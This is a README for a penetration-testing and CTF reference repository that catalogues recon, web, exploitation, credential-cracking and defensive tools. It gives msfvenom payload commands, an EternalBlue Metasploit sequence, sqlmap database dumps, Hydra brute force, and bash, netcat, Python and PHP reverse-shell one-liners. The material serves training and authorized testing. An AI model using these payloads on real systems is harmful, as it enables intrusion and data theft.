# 🔐 CyberVault

> A full cybersecurity knowledge base for recon, web testing, exploitation, privilege escalation, reverse engineering, blue-team defense, cloud security, and CTF practice.

[![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
[![Status](https://img.shields.io/badge/Status-Active-success?style=for-the-badge)](https://github.com/markehospes-art/CyberVault)
[![Type](https://img.shields.io/badge/Type-Knowledge%20Base-orange?style=for-the-badge)](https://github.com/markehospes-art/CyberVault)
[![Updated](https://img.shields.io/badge/Updated-October%202026-brightgreen?style=for-the-badge)]()

---

## 🚨 Legal & Ethical Notice

CyberVault is intended for:
- authorized security testing
- legal lab environments
- CTFs and training exercises
- defensive hardening and system security review
- educational study of cybersecurity tools and techniques

Do not use this repository to target systems, organizations, or networks without explicit authorization. Unauthorized activity may violate laws and professional ethics.

---

## 🧭 What CyberVault Is

CyberVault is a curated cybersecurity reference designed to help people understand not just the tools, but also how and when to use them.

It contains:
- recon and OSINT workflows
- network scanning and enumeration methods
- web exploitation and API testing guides
- privilege escalation checklists
- post-exploitation and persistence methods
- Windows Active Directory references
- Linux and cloud hardening notes
- defensive monitoring and incident response references
- CTF and learning path resources

This repo is meant to be practical and reference-driven, not just theoretical.

---

## 🗂️ Core Repository Structure

```text
CyberVault/
├── README.md
├── TOOLS.md
├── HOME.md
├── INDEX.md
├── QUICK-LINKS.md
├── FAQ.md
├── LICENSE
├── SECURITY.md
├── CONTRIBUTING.md
├── CODE_OF_CONDUCT.md
├── CheatSheets/
│   ├── Nmap.md
│   ├── Reverse-Shells.md
│   ├── SQL-Injection-Quick-Ref.md
│   ├── Privilege-Escalation-Checklist.md
│   ├── Active-Directory-Quick-Ref.md
│   ├── Burp-Suite.md
│   ├── Metasploit.md
│   ├── Home-Lab-Setup.md
│   ├── Command-Reference.md
│   └── ...
├── Knowledge/
│   ├── Networking/
│   ├── Linux/
│   ├── Web-Security/
│   ├── Crypto/
│   ├── Active-Directory/
│   ├── Password-Attacks/
│   ├── CTF/
│   ├── Wireless/
│   └── OSINT/
├── Scripts/
│   ├── README.md
│   ├── advanced-recon.md
│   ├── exploitation-techniques.md
│   ├── privilege-escalation.md
│   ├── linux-privilege-escalation.md
│   ├── windows-privilege-escalation.md
│   ├── post-exploitation.md
│   └── defensive-hardening.md
├── MOCs/
│   ├── Networking.md
│   ├── Linux-Exploitation.md
│   └── Active-Directory.md
├── .github/
│   └── README.md
└── .gitignore
```

---

## 🧱 The Most Important Tool Categories

### 1) Reconnaissance & OSINT
- Nmap
- Masscan
- Amass
- Subfinder
- theHarvester
- Shodan
- Recon-ng
- Netcat
- Wireshark
- Zeek

### 2) Web Security Testing
- Burp Suite
- OWASP ZAP
- SQLMap
- Nikto
- Gobuster
- Dirsearch
- Feroxbuster
- Wfuzz
- ffuf

### 3) Exploitation & Payloads
- Metasploit
- Msfvenom
- Searchsploit
- Exploit-DB
- PowerShell Empire
- Sliver
- Veil

### 4) Privilege Escalation
- Linux PE tools: sudo, linpeas, pspy, GTFOBins
- Windows PE tools: PowerUp, WinPEAS, Rubeus, Mimikatz
- AD tools: BloodHound, SharpHound, PowerView

### 5) Post-Exploitation
- BloodHound
- Mimikatz
- Rubeus
- Responder
- Evil-WinRM
- PowerView
- Chisel
- Plink

### 6) Password & Credential Attacks
- Hashcat
- John the Ripper
- Hydra
- Medusa
- CeWL
- Hydra

### 7) Reverse Engineering & Forensics
- Ghidra
- Radare2
- objdump
- strings
- binwalk
- Volatility
- Autopsy
- Wireshark

### 8) Defensive Security
- Suricata
- Snort
- Fail2ban
- Wazuh
- OSSEC
- Auditd
- YARA
- ClamAV

---

## 🛠️ Tool-by-Tool Guide Summary

The full tool catalog is maintained in [TOOLS.md](TOOLS.md). This README provides a practical overview.

### Reconnaissance Tools

#### Nmap
Purpose: port scanning, service discovery, OS detection.

```bash
# Basic scan
nmap target.example.com

# Scan specific ports
nmap -p 22,80,443 target.example.com

# Detect versions
nmap -sV target.example.com

# OS detection
nmap -O target.example.com

# Aggressive scan
nmap -A target.example.com

# Full port scan
nmap -p- target.example.com

# Save output
nmap -oN scan.txt target.example.com
nmap -oX scan.xml target.example.com
```

#### Masscan
Purpose: extremely fast internet-scale port scanning.

```bash
masscan 10.0.0.0/8 -p22,80,443 --rate=10000
masscan 192.168.1.0/24 -p0-65535 --rate=5000
```

#### Subfinder / Amass
Purpose: subdomain discovery.

```bash
subfinder -d example.com
amass enum -d example.com
```

#### TheHarvester
Purpose: OSINT collection.

```bash
# Email/subdomain discovery
theharvester -d example.com -b all

# Save to file
theharvester -d example.com -b google -f results.html
```

### Web Security Tools

#### Burp Suite
Purpose: intercept traffic and test web applications.

```bash
java -jar burpsuite_pro.jar
```

Typical workflow:
1. set browser proxy to 127.0.0.1:8080
2. capture request
3. replay in Repeater
4. send to Intruder for fuzzing
5. analyze server responses

#### SQLMap
Purpose: SQL injection testing automation.

```bash
sqlmap -u "http://target.com/page.php?id=1"
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump
```

#### Gobuster / Dirsearch / Feroxbuster
Purpose: directory and file brute force.

```bash
gobuster dir -u http://target.com -w common.txt
python3 dirsearch.py -u http://target.com -e php,html,txt
feroxbuster -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```

### Exploit / Payload Tools

#### Metasploit
Purpose: framework for exploit development and payload delivery.

```bash
msfconsole
search smb
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.10
set LHOST 10.0.0.5
set LPORT 4444
exploit
```

#### Msfvenom
Purpose: generate payloads.

```bash
# Windows executable reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe > shell.exe

# Linux ELF reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf > shell.elf

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw > shell.php
```

### Password & Credential Tools

#### Hashcat
Purpose: high-speed password cracking.

```bash
hashcat -m 1000 hashes.txt rockyou.txt
hashcat -m 0 md5hashes.txt wordlist.txt
hashcat --show -m 1000 hashes.txt
```

#### John the Ripper
Purpose: flexible password cracking.

```bash
john --wordlist=wordlist.txt hashes.txt
john --show hashes.txt
john --wordlist=wordlist.txt --rules hashes.txt
```

#### Hydra
Purpose: online brute force against common services.

```bash
hydra -l admin -P passwords.txt target.example.com http-post-form "/login:username=^USER^&password=^PASS^:F=invalid"
hydra -l root -P passwords.txt target.example.com ssh
```

### Privilege Escalation Tools

#### Linux
```bash
sudo -l
id
uname -a
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
```

#### Windows
```powershell
whoami /priv
systeminfo
net localgroup administrators
Get-ChildItem -Path C:\ -Recurse -Force
```

### Active Directory

#### BloodHound
```bash
SharpHound.exe --CollectionMethod All
# Import JSON output into BloodHound GUI
```

#### Rubeus
```powershell
Rubeus.exe kerberoast
Rubeus.exe asreproast
```

### Defense / Monitoring

#### Suricata / Snort
```bash
suricata -c /etc/suricata/suricata.yaml -i eth0
snort -A console -q -c /etc/snort/snort.conf -i eth0
```

#### Auditd
```bash
sudo auditctl -l
sudo ausearch -k suspicious
```

---

## 🔍 Practical Workflow

A realistic workflow for a target usually looks like this:

```bash
# 1. Discover live hosts
nmap -sn 10.10.10.0/24

# 2. Discover services and versions
nmap -sS -sV -A 10.10.10.10

# 3. Enumerate web dirs and files
gobuster dir -u http://10.10.10.10 -w common.txt

# 4. Check for obvious vulnerabilities
nikto -h http://10.10.10.10

# 5. Test for SQLi and app logic issues
sqlmap -u "http://10.10.10.10/login?id=1" --dbs

# 6. Post-exploitation and privilege escalation
sudo -l
find / -perm -4000 2>/dev/null
```

---

## 🧪 Quick Reference: Common Payloads and One-Liners

### Reverse shell examples

```bash
# Bash
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1

# Netcat
nc -e /bin/sh 10.0.0.5 4444

# Python
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.0.0.5",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'

# PHP
php -r '$sock=fsockopen("10.0.0.5",4444); exec("/bin/sh -i <&3 >&3 2>&3");'
```

### File and service enumeration

```bash
ls -la
find / -perm -4000 2>/dev/null
find / -writable 2>/dev/null | head
crontab -l
ls -la /etc/cron*
```

### Windows enumeration

```powershell
systeminfo
whoami /priv
net user
net localgroup administrators
Get-ADUser -Filter *
```

---

## 🚀 Learning Paths

### Beginner
```text
Networking → Linux → Web Security → CTF Practice → Defensive Security
```

### Pentester
```text
Recon → Enumeration → Exploitation → Privilege Escalation → Post-Exploitation → Reporting
```

### Blue Team
```text
Threat Modeling → Monitoring → Logs → EDR → IR → Forensics → Hardening
```

### Web Security
```text
HTTP/HTTPS → OWASP Top 10 → Burp → SQLi → XSS → API Testing → Bug Bounty
```

---

## 📚 Recommended References

- [OWASP](https://owasp.org)
- [MITRE ATT&CK](https://attack.mitre.org)
- [TryHackMe](https://tryhackme.com)
- [Hack The Box](https://hackthebox.com)
- [PortSwigger Academy](https://portswigger.net/web-security)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [GTFOBins](https://gtfobins.github.io)
- [LOLBAS](https://lolbas-project.github.io)

---

## 📑 Full Docs in This Repo

- [HOME.md](HOME.md)
- [INDEX.md](INDEX.md)
- [QUICK-LINKS.md](QUICK-LINKS.md)
- [TOOLS.md](TOOLS.md)
- [FAQ.md](FAQ.md)
- [Scripts/README.md](Scripts/README.md)
- [CheatSheets/Command-Reference.md](CheatSheets/Command-Reference.md)

---

## 📄 License

This project is licensed under the MIT License. See [LICENSE](LICENSE) for more information.

---

<div align="center">

Built for learning. Used responsibly.

</div>
